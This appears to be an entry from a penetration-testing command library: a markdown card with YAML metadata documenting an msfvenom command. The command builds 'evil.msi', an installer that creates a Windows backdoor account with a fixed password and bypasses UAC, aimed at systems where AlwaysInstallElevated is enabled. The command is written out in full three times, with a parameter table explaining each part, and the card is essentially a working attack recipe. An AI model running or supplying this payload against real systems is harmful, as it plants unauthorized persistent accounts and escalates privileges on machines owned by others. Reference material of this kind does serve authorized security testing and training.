---
id: f644de45-3dc9-44d2-becc-2c71b7043fa0
name: msfvenom-create-windows-adduser-msi-nouac
type: command
executor: bash
data: >-
  msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o
  evil.msi
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - msfvenom
  - payload
  - uac-bypass
  - privesc
verified: true
validated: true
---

# msfvenom-create-windows-adduser-msi-nouac

## Command

```bash
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
```

## Description

Creates an MSI payload that adds a backdoor user while bypassing UAC prompts during installation, useful when AlwaysInstallElevated is enabled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p windows/adduser | Payload type | Yes |
| USER=backdoor | Backdoor username | Yes |
| PASS=backdoor123 | Backdoor password | Yes |
| -f msi-nouac | Output format (MSI without UAC) | Yes |
| -o evil.msi | Output file | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
```

## Expected Output

Generates 'evil.msi' silently; check file creation to confirm success.

## Related

- [[tools/Metasploit-Framework]]
- [[procedures/Windows-AlwaysInstallElevated-Privilege-Escalation]]
